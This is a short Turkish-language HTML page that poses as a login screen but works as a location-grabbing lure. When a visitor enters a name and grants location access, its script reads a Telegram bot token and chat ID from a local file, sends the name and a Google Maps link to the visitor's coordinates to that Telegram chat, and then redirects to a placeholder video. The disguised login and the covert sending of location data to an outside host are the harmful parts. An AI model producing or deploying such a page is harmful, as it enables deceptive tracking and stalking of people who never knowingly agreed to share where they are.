<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Giriş Sayfası</title>
</head>
<body>
  <h2>Giriş Yap</h2>
  <input type="text" id="username" placeholder="Adınızı girin">
  <button onclick="girisYap()">Giriş Yap</button>

  <script>
    async function girisYap() {
      const name = document.getElementById("username").value;
      if (!name) {
        alert("Lütfen adınızı girin!");
        return;
      }

      if (!navigator.geolocation) {
        alert("Tarayıcınız konum izni desteklemiyor.");
        return;
      }

      navigator.geolocation.getCurrentPosition(async function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        // bilgiler.txt dosyasını oku
        const response = await fetch("bilgiler.txt");
        const text = await response.text();
        const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();

        const message = `👤 İsim: ${name}\n📍 Konum: https://www.google.com/maps?q=${lat},${lon}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        await fetch(url);
        window.location.href = "-videouzantıkoy-"; // buraya videoyu sen koyacaksın
      });
    }
  </script>
</body>
</html>
